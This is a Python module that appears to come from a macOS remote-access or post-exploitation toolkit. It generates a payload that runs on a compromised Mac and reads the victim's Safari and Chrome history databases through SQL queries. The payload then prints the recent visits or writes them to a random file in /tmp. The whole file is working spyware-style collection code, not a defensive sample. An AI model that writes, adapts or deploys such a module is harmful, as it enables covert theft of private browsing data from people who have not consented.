import uuid


class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Retrieves browser history (Chrome and Safari).",
            "References": []
        }
        self.history_limit = None
        self.output_file = None

    def setup(self, module_view, output_view, successful):
        self.history_limit = module_view.prompt("History limit [ENTER for 10]: ")
        self.output_file = module_view.prompt("Would you like to output to a file? [y/N]").lower()

        if not self.history_limit:
            self.history_limit = 10
        if not self.output_file or self.output_file == "n":
            self.output_file = ""
        elif self.output_file == "y":
            self.output_file = "/tmp/%s.txt" % str(uuid.uuid4()).replace("-", "")[0:12]

        if not str(self.history_limit).isdigit():
            output_view.add("Invalid history limit.", "attention")
            successful.put(False)
        else:
            successful.put(True)

    def run(self):
        return """\
        import sqlite3
        import os
        
        number = ""
        output_file = "%s"
        
        if output_file:
            print MESSAGE_INFO + "Writing browser history to: " + output_file
        
        try:
            safari_history = os.path.expanduser("~/Library/Safari/History.db")
            
            if os.path.isfile(safari_history):
                conn = sqlite3.connect(safari_history)
                cur = conn.cursor()
                
                cur.execute("SELECT datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as last_visited, hi.url, hv.title FROM history_visits hv, history_items hi WHERE hv.history_item = hi.id;")
                statement = cur.fetchall()
                
                number = %s * -1
                
                if not output_file:
                    print MESSAGE_INFO + "Safari history: "
                
                    for item in statement[number:]:
                        print item
                else:
                    # Write output to file.
                    with open(output_file, "a+") as out:
                        for item in statement[number:]:
                            out.write(str(item) + "\\n")
                        out.write("\\n")
                    
                conn.close()
        except Exception as ex:
            print MESSAGE_ATTENTION + "Error (Safari): " + str(ex)
                
        try:        
            chrome_history = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/History")
            
            if os.path.isfile(chrome_history):
                conn = sqlite3.connect(chrome_history)
                cur = conn.cursor()
                
                cur.execute("SELECT datetime(last_visit_time/1000000-11644473600, \\"unixepoch\\") as last_visited, url, title, visit_count FROM urls;")
                statement = cur.fetchall()
                
                number = %s * -1
                
                if not output_file:
                    print ""
                    print MESSAGE_INFO + "Chrome history: "
                    
                    for item in statement[number:]:
                        print item
                else:
                    # Write output to file.
                    with open(output_file, "a+") as out:
                        for item in statement[number:]:
                            out.write(str(item) + "\\n")
                
                conn.close()
        except Exception as ex:
            print MESSAGE_ATTENTION + "Error (Chrome): " + str(ex)
        """ % (self.output_file, self.history_limit, self.history_limit)
